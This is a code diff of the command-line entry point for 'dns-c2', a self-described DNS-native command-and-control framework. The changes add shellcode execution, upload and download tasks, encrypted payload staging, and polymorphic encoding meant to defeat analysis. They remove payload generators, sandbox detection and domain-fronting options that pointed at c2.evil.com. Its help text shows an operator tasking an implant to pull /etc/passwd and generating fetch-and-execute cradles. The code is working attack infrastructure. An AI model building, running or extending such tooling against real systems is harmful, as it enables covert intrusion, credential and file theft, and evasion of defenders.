@@ -3,11 +3,7 @@ use dns_c2::c2;
 use dns_c2::cradle;
 use dns_c2::crypto;
 use dns_c2::dns;
-use dns_c2::encoder;
-use dns_c2::evasion;
-use dns_c2::payload;
-use dns_c2::traffic;
-use dns_c2::transport;
+use dns_c2::encoding;
 
 use clap::{Parser, Subcommand, ValueEnum};
 use log::info;
@@ -30,12 +26,15 @@ AGENT QUICK START:
 
 STAGING (cradle-based delivery):
   $ dns-c2 stage -d stg.example.com -f ./payload.sh -l loader
-  $ dns-c2 cradle -s bash -d stg.example.com -l loader";
+  $ dns-c2 cradle -s bash -d stg.example.com -l loader
+
+ENCODING (polymorphic shellcode):
+  $ dns-c2 encode -f shellcode.bin -o encoded.bin --passes 3";
 
 #[derive(Parser)]
 #[command(
     name = "dns-c2",
-    version = "0.1.0",
+    version = "0.2.0",
     about = "dns-c2 — DNS-native C2 framework",
     long_about = LONG_ABOUT,
 )]
@@ -48,6 +47,8 @@ struct Cli {
 enum Backend {
     /// Cloudflare DNS API
     Cloudflare,
+    /// DNS-over-HTTPS (reads via DoH, writes via Cloudflare API)
+    Doh,
     /// Local JSON file — no network, for development
     Local,
 }
@@ -73,6 +74,10 @@ struct ConnArgs {
     /// Local JSON store path
     #[arg(long, default_value = "./c2-records.json")]
     store_path: PathBuf,
+
+    /// DoH server URL (for doh backend)
+    #[arg(long, env = "C2_DOH_SERVER", default_value = "https://cloudflare-dns.com/dns-query")]
+    doh_server: String,
 }
 
 #[derive(Subcommand)]
@@ -100,6 +105,10 @@ enum Commands {
         #[arg(long, default_value_t = 0.3)]
         jitter: f64,
 
+        /// Jitter strategy (linear, exponential, adaptive, bursty)
+        #[arg(long, default_value = "linear")]
+        jitter_strategy: String,
+
         /// Override auto-generated session ID
         #[arg(long)]
         session_id: Option<String>,
@@ -125,12 +134,15 @@ enum Commands {
     /// Sends a command and waits for the response (or use --no-wait).
     ///
     /// Available commands: shell, ls, cat, pwd, whoami, ps, env,
-    ///                     download, id, hostname, netstat, exit
+    ///                     download, upload, id, hostname, netstat,
+    ///                     sysinfo, execute-shellcode, exit
     ///
     /// Examples:
     ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 shell whoami
     ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 ls /etc
     ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 download /etc/passwd
+    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 sysinfo
+    ///   dns-c2 task ... -s abc123 execute-shellcode <base64_shellcode>
     Task {
         #[command(flatten)]
         conn: ConnArgs,
@@ -184,10 +196,12 @@ enum Commands {
 
     /// Stage a payload into DNS for cradle-based delivery
     ///
-    /// NOTE: Staged payloads are plain base64, NOT encrypted.
+    /// By default staged payloads are plain base64 (for native tool compatibility).
+    /// Use --encrypt to encrypt with ChaCha20-Poly1305 (requires agent-side key).
     ///
     /// Example:
     ///   dns-c2 stage -d stg.example.com -f ./payload.sh -l loader
+    ///   dns-c2 stage -d stg.example.com -f ./payload.sh -l loader --encrypt -k $KEY
     Stage {
         #[command(flatten)]
         conn: ConnArgs,
@@ -200,9 +214,17 @@ enum Commands {
         #[arg(short, long)]
         label: String,
 
-        /// Payload type (auto-detected if omitted)
+        /// Payload type (auto-detected if omitted: script, elf, pe, shellcode)
         #[arg(long, value_name = "TYPE")]
         r#type: Option<String>,
+
+        /// Encrypt the staged payload (requires -k)
+        #[arg(long, default_value_t = false)]
+        encrypt: bool,
+
+        /// Encryption key (required if --encrypt is set)
+        #[arg(short, long, env = "C2_KEY")]
+        key: Option<String>,
     },
 
     /// Generate a cradle one-liner to fetch and execute a staged payload
@@ -236,61 +258,13 @@ enum Commands {
         label: String,
     },
 
-    /// Generate advanced payloads (shellcode, PIC, Donut-style, reflective)
+    /// Encode a payload with polymorphic XOR encoding (SGN-style)
     ///
-    /// Convert binaries to shellcode, wrap in PIC loaders, or generate
-    /// staged DNS loaders. Supports ELF and PE formats.
+    /// Produces different output each run, even for identical input.
+    /// The encoded payload is self-contained (includes decoder metadata).
     ///
-    /// Examples:
-    ///   dns-c2 generate -f ./implant -o shellcode.bin --format elf-pic
-    ///   dns-c2 generate -f ./payload.exe -o sc.bin --format pe-to-shellcode --compress
-    ///   dns-c2 generate -f ./implant -o loader.sh --format staged-dns --domain c2.example.com --label loader -k $KEY
-    Generate {
-        /// Input binary file
-        #[arg(short, long)]
-        file: PathBuf,
-
-        /// Output file
-        #[arg(short, long)]
-        output: PathBuf,
-
-        /// Payload format
-        #[arg(long, default_value = "pe-to-shellcode")]
-        format: String,
-
-        /// Compress the payload
-        #[arg(long, default_value_t = false)]
-        compress: bool,
-
-        /// XOR key for additional encryption layer (hex)
-        #[arg(long)]
-        xor_key: Option<String>,
-
-        /// Add anti-debug checks to PIC wrapper
-        #[arg(long, default_value_t = false)]
-        anti_debug: bool,
-
-        /// Encryption key (for staged DNS loader)
-        #[arg(short, long, env = "C2_KEY")]
-        key: Option<String>,
-
-        /// Domain (for staged DNS loader)
-        #[arg(long)]
-        domain: Option<String>,
-
-        /// Label (for staged DNS loader)
-        #[arg(long)]
-        label: Option<String>,
-    },
-
-    /// Encode/obfuscate a payload through a polymorphic encoder chain
-    ///
-    /// Applies multiple encoding passes (XOR, substitution, dead bytes, entropy
-    /// normalization) to evade signature-based detection.
-    ///
-    /// Examples:
-    ///   dns-c2 encode -f payload.bin -o encoded.bin --preset heavy
-    ///   dns-c2 encode -f payload.bin -o encoded.bin --passes xor,deadbytes,reverse
+    /// Example:
+    ///   dns-c2 encode -f shellcode.bin -o encoded.bin --passes 3
     Encode {
         /// Input file
         #[arg(short, long)]
@@ -300,86 +274,65 @@ enum Commands {
         #[arg(short, long)]
         output: PathBuf,
 
-        /// Encoder preset (light, medium, heavy)
-        #[arg(long, default_value = "medium")]
-        preset: String,
+        /// Number of encoding passes (more = more obfuscation)
+        #[arg(long, default_value_t = 3)]
+        passes: usize,
 
-        /// Save decode keys to this file (needed for decoding)
+        /// Pad output to this size (bytes) for traffic analysis resistance
         #[arg(long)]
-        keys_file: Option<PathBuf>,
+        pad_to: Option<usize>,
     },
 
-    /// Analyze payload entropy and security characteristics
+    /// Decode a polymorphic-encoded payload
     ///
-    /// Examples:
-    ///   dns-c2 analyze -f payload.bin
-    Analyze {
-        /// Input file to analyze
+    /// Example:
+    ///   dns-c2 decode -f encoded.bin -o decoded.bin
+    Decode {
+        /// Input file (encoded)
         #[arg(short, long)]
         file: PathBuf,
-    },
 
-    /// Run anti-analysis environment checks
-    ///
-    /// Detects VMs, sandboxes, debuggers, and analysis tools.
-    /// Returns a confidence score for whether the environment is being analyzed.
-    Envcheck,
+        /// Output file (decoded)
+        #[arg(short, long)]
+        output: PathBuf,
 
-    /// Generate domain fronting configuration
-    ///
-    /// Examples:
-    ///   dns-c2 fronting --cdn cloudflare --front cdn.example.com --real c2.evil.com
-    Fronting {
-        /// CDN provider (cloudflare, cloudfront, azure, fastly, generic)
-        #[arg(long, default_value = "cloudflare")]
-        cdn: String,
-
-        /// Front domain (visible to network observers)
-        #[arg(long)]
-        front: String,
-
-        /// Real host (delivered via Host header)
-        #[arg(long)]
-        real: String,
-
-        /// HTTP path
-        #[arg(long, default_value = "/api/v1/telemetry")]
-        path: String,
-
-        /// Output test request
+        /// Input is padded (unpad before decoding)
         #[arg(long, default_value_t = false)]
-        test: bool,
-    },
-
-    /// Show transport channel status and configuration
-    ///
-    /// Examples:
-    ///   dns-c2 channels --preset stealthy
-    Channels {
-        /// Channel preset (stealthy, aggressive, fronted)
-        #[arg(long, default_value = "stealthy")]
-        preset: String,
-
-        /// Cloudflare API token
-        #[arg(long, env = "C2_CF_TOKEN")]
-        token: Option<String>,
-
-        /// Cloudflare Zone ID
-        #[arg(long, env = "C2_CF_ZONE")]
-        zone: Option<String>,
+        padded: bool,
     },
 }
 
 fn make_backend(conn: &ConnArgs) -> Box<dyn dns::DnsBackend> {
     match conn.backend {
         Backend::Cloudflare => {
-            let token = conn.token.clone()
+            let token = conn
+                .token
+                .clone()
                 .expect("Cloudflare backend requires --token or C2_CF_TOKEN");
-            let zone = conn.zone.clone()
+            let zone = conn
+                .zone
+                .clone()
                 .expect("Cloudflare backend requires --zone or C2_CF_ZONE");
-            let retry = dns::retry::RetryBackend::with_defaults(
-                Box::new(dns::cloudflare::CloudflareBackend::new(token, zone))
+            let retry = dns::retry::RetryBackend::with_defaults(Box::new(
+                dns::cloudflare::CloudflareBackend::new(token, zone),
+            ));
+            Box::new(retry)
+        }
+        Backend::Doh => {
+            let token = conn
+                .token
+                .clone()
+                .expect("DoH backend requires --token or C2_CF_TOKEN (for writes)");
+            let zone = conn
+                .zone
+                .clone()
+                .expect("DoH backend requires --zone or C2_CF_ZONE (for writes)");
+            let doh = dns::doh::DoHBackend::new(
+                conn.doh_server.clone(),
+                token,
+                zone,
             );
+            let retry = dns::retry::RetryBackend::with_defaults(Box::new(doh));
             Box::new(retry)
         }
         Backend::Local => {
@@ -390,19 +343,31 @@ fn make_backend(conn: &ConnArgs) -> Box<dyn dns::DnsBackend> {
 }
 
 fn main() {
-    env_logger::Builder::from_env(
-        env_logger::Env::default().default_filter_or("warn")
-    ).init();
+    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("warn")).init();
 
     let cli = Cli::parse();
 
     match cli.command {
         // ─── C2 Agent ───
-        Commands::Agent { conn, key, interval, jitter, session_id } => {
+        Commands::Agent {
+            conn,
+            key,
+            interval,
+            jitter,
+            jitter_strategy,
+            session_id,
+        } => {
             let master_key = crypto::key_from_hex(&key).expect("Invalid key");
             let session = session_id.unwrap_or_else(c2::generate_session_id);
             let backend = make_backend(&conn);
             let rt = tokio::runtime::Runtime::new().unwrap();
+
+            let strategy = jitter_strategy
+                .parse::<agent::JitterStrategy>()
+                .unwrap_or_else(|e| {
+                    eprintln!("{e}");
+                    std::process::exit(1);
+                });
 
             let config = agent::AgentConfig {
                 domain: conn.domain,
@@ -410,10 +375,16 @@ fn main() {
                 session_id: session.clone(),
                 poll_interval_secs: interval,
                 jitter_pct: jitter.clamp(0.0, 1.0),
+                jitter_strategy: strategy,
             };
 
-            eprintln!("dns-c2 agent | session={} interval={}s jitter={:.0}%",
-                session, interval, jitter * 100.0);
+            eprintln!(
+                "dns-c2 agent | session={} interval={}s jitter={:.0}% strategy={}",
+                session,
+                interval,
+                jitter * 100.0,
+                strategy
+            );
 
             rt.block_on(async {
                 if let Err(e) = agent::run(backend.as_ref(), &config).await {
@@ -450,7 +421,15 @@ fn main() {
         }
 
         // ─── Send Task ───
-        Commands::Task { conn, key, session, command, args, no_wait, timeout } => {
+        Commands::Task {
+            conn,
+            key,
+            session,
+            command,
+            args,
+            no_wait,
+            timeout,
+        } => {
             let master_key = crypto::key_from_hex(&key).expect("Invalid key");
             let backend = make_backend(&conn);
             let rt = tokio::runtime::Runtime::new().unwrap();
@@ -461,28 +440,48 @@ fn main() {
                 command: command.clone(),
                 args: args.clone(),
                 timestamp: std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap()
+                    .as_secs(),
             };
 
             rt.block_on(async {
-                // Send task
-                if let Err(e) = c2::send_task(backend.as_ref(), &conn.domain, &master_key, &session, &task).await {
+                if let Err(e) = c2::send_task(
+                    backend.as_ref(),
+                    &conn.domain,
+                    &master_key,
+                    &session,
+                    &task,
+                )
+                .await
+                {
                     eprintln!("Failed to send task: {e}");
                     std::process::exit(1);
                 }
-                eprintln!("Sent: {} {} → session {} [task={}]",
-                    command, args.join(" "), session, task_id);
+                eprintln!(
+                    "Sent: {} {} → session {} [task={}]",
+                    command,
+                    args.join(" "),
+                    session,
+                    task_id
+                );
 
                 if no_wait {
                     println!("task_id={task_id}");
                     return;
                 }
 
-                // Wait for response
                 eprintln!("Waiting for response (timeout={}s)...", timeout);
                 match c2::wait_for_response(
-                    backend.as_ref(), &conn.domain, &master_key, &session, &task_id, timeout,
-                ).await {
+                    backend.as_ref(),
+                    &conn.domain,
+                    &master_key,
+                    &session,
+                    &task_id,
+                    timeout,
+                )
+                .await
+                {
                     Ok(resp) => {
                         eprintln!("[{}] task={}", resp.status, resp.task_id);
                         println!("{}", resp.output);
@@ -496,13 +495,26 @@ fn main() {
         }
 
         // ─── Read Result ───
-        Commands::Result { conn, key, session, task_id } => {
+        Commands::Result {
+            conn,
+            key,
+            session,
+            task_id,
+        } => {
             let master_key = crypto::key_from_hex(&key).expect("Invalid key");
             let backend = make_backend(&conn);
             let rt = tokio::runtime::Runtime::new().unwrap();
 
             rt.block_on(async {
-                match c2::read_response(backend.as_ref(), &conn.domain, &master_key, &session, &task_id).await {
+                match c2::read_response(
+                    backend.as_ref(),
+                    &conn.domain,
+                    &master_key,
+                    &session,
+                    &task_id,
+                )
+                .await
+                {
                     Ok(Some(resp)) => {
                         eprintln!("[{}] task={}", resp.status, resp.task_id);
                         println!("{}", resp.output);
@@ -526,37 +538,91 @@ fn main() {
         }
 
         // ─── Stage ───
-        Commands::Stage { conn, file, label, r#type } => {
+        Commands::Stage {
+            conn,
+            file,
+            label,
+            r#type,
+            encrypt,
+            key,
+        } => {
             let data = std::fs::read(&file).unwrap_or_else(|e| {
                 eprintln!("Failed to read {}: {e}", file.display());
                 std::process::exit(1);
             });
 
-            let payload_type = r#type.map(|t| t.parse::<cradle::PayloadType>().unwrap_or_else(|e| {
-                eprintln!("Invalid type: {e}");
-                std::process::exit(1);
-            }));
+            let payload_type = r#type.map(|t| {
+                t.parse::<cradle::PayloadType>().unwrap_or_else(|e| {
+                    eprintln!("Invalid type: {e}");
+                    std::process::exit(1);
+                })
+            });
+
+            let enc_key = if encrypt {
+                let k = key.as_ref().unwrap_or_else(|| {
+                    eprintln!("--encrypt requires --key or C2_KEY");
+                    std::process::exit(1);
+                });
+                Some(crypto::key_from_hex(k).unwrap_or_else(|e| {
+                    eprintln!("Invalid key: {e}");
+                    std::process::exit(1);
+                }))
+            } else {
+                None
+            };
 
             let backend = make_backend(&conn);
             let rt = tokio::runtime::Runtime::new().unwrap();
 
-            eprintln!("Staging {} ({} bytes) as '{}'...", file.display(), data.len(), label);
+            eprintln!(
+                "Staging {} ({} bytes) as '{}'{} ...",
+                file.display(),
+                data.len(),
+                label,
+                if encrypt { " [encrypted]" } else { "" }
+            );
             rt.block_on(async {
-                match cradle::stage_payload(backend.as_ref(), &conn.domain, &label, &data, payload_type).await {
+                match cradle::stage_payload(
+                    backend.as_ref(),
+                    &conn.domain,
+                    &label,
+                    &data,
+                    payload_type,
+                    encrypt,
+                    enc_key.as_ref(),
+                )
+                .await
+                {
                     Ok(meta) => {
-                        eprintln!("Staged: {} chunks, type={}, hash={}",
-                            meta.chunks, meta.payload_type, meta.hash);
+                        eprintln!(
+                            "Staged: {} chunks, type={}, hash={}, encrypted={}",
+                            meta.chunks, meta.payload_type, meta.hash, meta.encrypted
+                        );
                         eprintln!("\nGenerate cradles:");
-                        eprintln!("  dns-c2 cradle -s bash -d {} -l {}", conn.domain, label);
-                        eprintln!("  dns-c2 cradle -s pwsh -d {} -l {}", conn.domain, label);
+                        eprintln!(
+                            "  dns-c2 cradle -s bash -d {} -l {}",
+                            conn.domain, label
+                        );
+                        eprintln!(
+                            "  dns-c2 cradle -s pwsh -d {} -l {}",
+                            conn.domain, label
+                        );
                     }
-                    Err(e) => { eprintln!("Stage failed: {e}"); std::process::exit(1); }
+                    Err(e) => {
+                        eprintln!("Stage failed: {e}");
+                        std::process::exit(1);
+                    }
                 }
             });
         }
 
         // ─── Cradle ───
-        Commands::Cradle { conn, shell, label, ns } => {
+        Commands::Cradle {
+            conn,
+            shell,
+            label,
+            ns,
+        } => {
             let shell_type = shell.parse::<cradle::Shell>().unwrap_or_else(|e| {
                 eprintln!("{e}");
                 std::process::exit(1);
@@ -565,14 +631,24 @@ fn main() {
             let backend = make_backend(&conn);
             let rt = tokio::runtime::Runtime::new().unwrap();
 
-            let meta = rt.block_on(async {
-                cradle::read_stage_meta(backend.as_ref(), &conn.domain, &label).await
-            }).unwrap_or_else(|e| {
-                eprintln!("Failed to read metadata: {e}");
-                std::process::exit(1);
-            });
+            let meta = rt
+                .block_on(async {
+                    cradle::read_stage_meta(backend.as_ref(), &conn.domain, &label).await
+                })
+                .unwrap_or_else(|e| {
+                    eprintln!("Failed to read metadata: {e}");
+                    std::process::exit(1);
+                });
 
-            println!("{}", cradle::generate_cradle(shell_type, &conn.domain, &label, &meta, ns.as_deref()));
+            if meta.encrypted {
+                eprintln!("WARNING: Payload is encrypted — native cradle will fetch ciphertext.");
+                eprintln!("Agent-side decryption is required.");
+            }
+
+            println!(
+                "{}",
+                cradle::generate_cradle(shell_type, &conn.domain, &label, &meta, ns.as_deref())
+            );
         }
 
         // ─── Unstage ───
@@ -583,288 +659,83 @@ fn main() {
             rt.block_on(async {
                 match cradle::unstage_payload(backend.as_ref(), &conn.domain, &label).await {
                     Ok(count) => eprintln!("Deleted {count} records"),
-                    Err(e) => { eprintln!("Unstage failed: {e}"); std::process::exit(1); }
-                }
-            });
-        }
-
-        // ─── Generate Advanced Payload ───
-        Commands::Generate { file, output, format, compress, xor_key, anti_debug, key, domain, label } => {
-            let data = std::fs::read(&file).unwrap_or_else(|e| {
-                eprintln!("Failed to read {}: {e}", file.display());
-                std::process::exit(1);
-            });
-
-            eprintln!("Input: {} ({} bytes)", file.display(), data.len());
-
-            let result: Vec<u8> = match format.as_str() {
-                "pe-to-shellcode" | "donut" => {
-                    let xor = xor_key.map(|k| hex::decode(k).unwrap_or_else(|e| {
-                        eprintln!("Invalid XOR key: {e}"); std::process::exit(1);
-                    }));
-                    let config = payload::donut::DonutConfig {
-                        compress,
-                        xor_key: xor,
-                        ..Default::default()
-                    };
-                    payload::donut::pe_to_shellcode(&data, &config).unwrap_or_else(|e| {
-                        eprintln!("PE-to-shellcode failed: {e}"); std::process::exit(1);
-                    })
-                }
-                "elf-pic" | "pic" => {
-                    let k = key.map(|k| crypto::key_from_hex(&k).unwrap_or_else(|e| {
-                        eprintln!("Invalid key: {e}"); std::process::exit(1);
-                    }));
-                    let config = payload::pic::PicConfig {
-                        encrypt: k.is_some(),
-                        key: k,
-                        anti_debug,
-                        ..Default::default()
-                    };
-                    payload::pic::wrap_pic(&data, &config).unwrap_or_else(|e| {
-                        eprintln!("PIC wrap failed: {e}"); std::process::exit(1);
-                    })
-                }
-                "reflective" | "relf" => {
-                    let config = payload::reflective::ReflectiveConfig {
-                        compress,
-                        ..Default::default()
-                    };
-                    payload::reflective::generate_reflective_loader(&data, &config).unwrap_or_else(|e| {
-                        eprintln!("Reflective loader failed: {e}"); std::process::exit(1);
-                    })
-                }
-                "shellcode" | "extract" => {
-                    if data.len() >= 4 && &data[..4] == b"\x7fELF" {
-                        payload::shellcode::extract_elf_text(&data).unwrap_or_else(|e| {
-                            eprintln!("ELF extraction failed: {e}"); std::process::exit(1);
-                        })
-                    } else if data.len() >= 2 && &data[..2] == b"MZ" {
-                        payload::shellcode::extract_pe_text(&data).unwrap_or_else(|e| {
-                            eprintln!("PE extraction failed: {e}"); std::process::exit(1);
-                        })
-                    } else {
-                        eprintln!("Unknown binary format"); std::process::exit(1);
+                    Err(e) => {
+                        eprintln!("Unstage failed: {e}");
+                        std::process::exit(1);
                     }
                 }
-                "memfd-stub" => {
-                    payload::shellcode::generate_memfd_stub(&data, payload::Arch::X86_64).unwrap_or_else(|e| {
-                        eprintln!("Memfd stub failed: {e}"); std::process::exit(1);
-                    })
-                }
-                "staged-dns" | "stager" => {
-                    let k = key.unwrap_or_else(|| {
-                        eprintln!("--key required for staged-dns format"); std::process::exit(1);
-                    });
-                    let master_key = crypto::key_from_hex(&k).unwrap_or_else(|e| {
-                        eprintln!("Invalid key: {e}"); std::process::exit(1);
-                    });
-                    let d = domain.unwrap_or_else(|| {
-                        eprintln!("--domain required for staged-dns format"); std::process::exit(1);
-                    });
-                    let l = label.unwrap_or_else(|| "payload".to_string());
-
-                    let config = payload::staged::StagerConfig {
-                        domain: d,
-                        label: l,
-                        chunk_count: (data.len() / 1350) + 1,
-                        key: master_key,
-                        dns_server: None,
-                        query_jitter_ms: 100,
-                        method: payload::staged::DnsQueryMethod::SystemResolver,
-                    };
-                    let script = payload::staged::generate_stager_script(
-                        &config, payload::staged::StagerShell::Bash,
-                    ).unwrap_or_else(|e| {
-                        eprintln!("Stager generation failed: {e}"); std::process::exit(1);
-                    });
-                    script.into_bytes()
-                }
-                other => {
-                    eprintln!("Unknown format: {other}");
-                    eprintln!("Available: pe-to-shellcode, elf-pic, reflective, shellcode, memfd-stub, staged-dns");
-                    std::process::exit(1);
-                }
-            };
-
-            std::fs::write(&output, &result).unwrap_or_else(|e| {
-                eprintln!("Failed to write {}: {e}", output.display());
-                std::process::exit(1);
             });
-            eprintln!("Output: {} ({} bytes, format={})", output.display(), result.len(), format);
         }
 
-        // ─── Encode/Obfuscate ───
-        Commands::Encode { file, output, preset, keys_file } => {
+        // ─── Encode ───
+        Commands::Encode {
+            file,
+            output,
+            passes,
+            pad_to,
+        } => {
             let data = std::fs::read(&file).unwrap_or_else(|e| {
                 eprintln!("Failed to read {}: {e}", file.display());
                 std::process::exit(1);
             });
 
-            let chain = match preset.as_str() {
-                "light" => encoder::EncoderChain::light(),
-                "medium" => encoder::EncoderChain::medium(),
-                "heavy" => encoder::EncoderChain::heavy(),
-                _ => {
-                    eprintln!("Unknown preset: {preset} (try: light, medium, heavy)");
-                    std::process::exit(1);
-                }
-            };
+            let mut encoded = encoding::encode_payload(&data, passes);
 
-            let encoded = chain.encode(&data).unwrap_or_else(|e| {
-                eprintln!("Encoding failed: {e}");
-                std::process::exit(1);
-            });
+            if let Some(target_size) = pad_to {
+                encoded = encoding::pad_to_size(&encoded, target_size);
+            }
 
-            std::fs::write(&output, &encoded.data).unwrap_or_else(|e| {
+            std::fs::write(&output, &encoded).unwrap_or_else(|e| {
                 eprintln!("Failed to write {}: {e}", output.display());
                 std::process::exit(1);
             });
 
-            eprintln!("Encoded: {} → {} ({} bytes → {} bytes, {} passes)",
-                file.display(), output.display(),
-                data.len(), encoded.data.len(), encoded.num_passes);
-
-            if let Some(kf) = keys_file {
-                let keys_json = serde_json::to_string_pretty(&encoded.decode_keys).unwrap();
-                std::fs::write(&kf, keys_json).unwrap_or_else(|e| {
-                    eprintln!("Failed to write keys: {e}");
-                    std::process::exit(1);
-                });
-                eprintln!("Decode keys: {}", kf.display());
-            } else {
-                eprintln!("WARNING: No --keys-file specified. Decode keys are lost!");
-            }
-        }
-
-        // ─── Analyze ───
-        Commands::Analyze { file } => {
-            let data = std::fs::read(&file).unwrap_or_else(|e| {
-                eprintln!("Failed to read {}: {e}", file.display());
-                std::process::exit(1);
-            });
-
-            let report = encoder::entropy::analyze(&data);
-
-            println!("=== Entropy Analysis: {} ===", file.display());
-            println!("Size:           {} bytes", data.len());
-            println!("Entropy:        {:.4} bits/byte", report.overall);
-            println!("Classification: {:?}", report.classification);
-            println!("Suspicious:     {}", if report.suspicious { "YES" } else { "no" });
-            println!();
-
-            // Detect binary format
-            if data.len() >= 4 {
-                if &data[..4] == b"\x7fELF" {
-                    println!("Format:         ELF");
-                    if let Ok(arch) = payload::detect_arch(&data) {
-                        println!("Architecture:   {arch}");
-                    }
-                } else if &data[..2] == b"MZ" {
-                    println!("Format:         PE");
-                    if let Ok(info) = payload::donut::parse_pe(&data) {
-                        println!("Architecture:   {}", info.arch);
-                        println!("DLL:            {}", info.is_dll);
-                        println!(".NET:           {}", info.is_dotnet);
-                        println!("Relocations:    {}", info.has_relocations);
-                        println!("TLS:            {}", info.has_tls);
-                    }
-                } else if &data[..4] == b"OBFS" {
-                    println!("Format:         ObFUSE shellcode package");
-                } else if &data[..4] == b"RELF" {
-                    println!("Format:         Reflective ELF loader");
-                }
-            }
-
-            println!();
-            println!("Per-block entropy ({} blocks of 256B):", report.block_entropies.len());
-            for (offset, entropy) in report.block_entropies.iter().take(20) {
-                let bar_len = (entropy * 8.0) as usize;
-                let bar: String = "█".repeat(bar_len.min(64));
-                println!("  0x{offset:06x}: {entropy:.2} {bar}");
-            }
-            if report.block_entropies.len() > 20 {
-                println!("  ... ({} more blocks)", report.block_entropies.len() - 20);
-            }
-        }
-
-        // ─── Envcheck ───
-        Commands::Envcheck => {
-            let report = evasion::anti_analysis::run_all_checks();
-            println!("=== Environment Analysis ===");
-            println!("Confidence:     {:.0}% analysis environment", report.confidence * 100.0);
-            println!("Verdict:        {}", if report.is_analysis_env { "ANALYSIS ENVIRONMENT" } else { "likely clean" });
-            println!();
-            for check in &report.checks {
-                let icon = if check.detected { "[!]" } else { "[+]" };
-                println!("  {icon} {:<18} {}", check.name, check.detail);
-            }
-        }
-
-        // ─── Domain Fronting ───
-        Commands::Fronting { cdn, front, real, path, test } => {
-            let provider = match cdn.as_str() {
-                "cloudflare" | "cf" => traffic::fronting::CdnProvider::Cloudflare,
-                "cloudfront" | "aws" => traffic::fronting::CdnProvider::CloudFront,
-                "azure" => traffic::fronting::CdnProvider::AzureCdn,
-                "fastly" => traffic::fronting::CdnProvider::Fastly,
-                "generic" => traffic::fronting::CdnProvider::Generic,
-                _ => {
-                    eprintln!("Unknown CDN: {cdn} (try: cloudflare, cloudfront, azure, fastly, generic)");
-                    std::process::exit(1);
-                }
-            };
-
-            let config = traffic::fronting::FrontingConfig {
-                front_domain: front.clone(),
-                real_host: real.clone(),
-                cdn: provider,
-                path,
-                ..Default::default()
-            };
-
-            println!("=== Domain Fronting Configuration ===");
-            println!("CDN:          {cdn}");
-            println!("Front domain: {front} (visible in SNI/DNS)");
-            println!("Real host:    {real} (in Host header)");
-            println!("Path:         {}", config.path);
-
-            if test {
-                println!();
-                let req = traffic::fronting::build_fronted_request(
-                    &config, b"test-payload", traffic::fronting::HttpMethod::Post,
-                ).unwrap();
-                println!("=== Test Request ===");
-                println!("{}", req.to_raw_http());
-            }
-        }
-
-        // ─── Transport Channels ───
-        Commands::Channels { preset, token, zone } => {
-            let t = token.as_deref().unwrap_or("YOUR_TOKEN");
-            let z = zone.as_deref().unwrap_or("YOUR_ZONE");
-
-            let channels = match preset.as_str() {
-                "stealthy" => transport::channel::preset_stealthy("c2.domain", t, z),
-                "aggressive" => transport::channel::preset_aggressive("c2.domain", t, z),
-                _ => {
-                    eprintln!("Unknown preset: {preset} (try: stealthy, aggressive)");
-                    std::process::exit(1);
-                }
-            };
-
-            let chain = transport::chain::TransportChain::new(
-                channels,
-                transport::chain::FailoverStrategy::Priority,
+            eprintln!(
+                "Encoded {} → {} ({} bytes → {} bytes, {} passes)",
+                file.display(),
+                output.display(),
+                data.len(),
+                encoded.len(),
+                passes
             );
+        }
 
-            println!("=== Transport Channel Configuration ({preset}) ===");
-            println!("Channels: {}", chain.channel_count());
-            println!("Healthy:  {}", chain.healthy_count());
-            println!();
-            for report in chain.status_report() {
-                println!("  {report}");
-            }
+        // ─── Decode ───
+        Commands::Decode {
+            file,
+            output,
+            padded,
+        } => {
+            let data = std::fs::read(&file).unwrap_or_else(|e| {
+                eprintln!("Failed to read {}: {e}", file.display());
+                std::process::exit(1);
+            });
+
+            let payload = if padded {
+                encoding::unpad(&data).unwrap_or_else(|| {
+                    eprintln!("Failed to unpad data");
+                    std::process::exit(1);
+                })
+            } else {
+                data
+            };
+
+            let decoded = encoding::decode_payload(&payload).unwrap_or_else(|| {
+                eprintln!("Failed to decode payload (invalid format)");
+                std::process::exit(1);
+            });
+
+            std::fs::write(&output, &decoded).unwrap_or_else(|e| {
+                eprintln!("Failed to write {}: {e}", output.display());
+                std::process::exit(1);
+            });
+
+            eprintln!(
+                "Decoded {} → {} ({} bytes)",
+                file.display(),
+                output.display(),
+                decoded.len()
+            );
         }
     }
 }
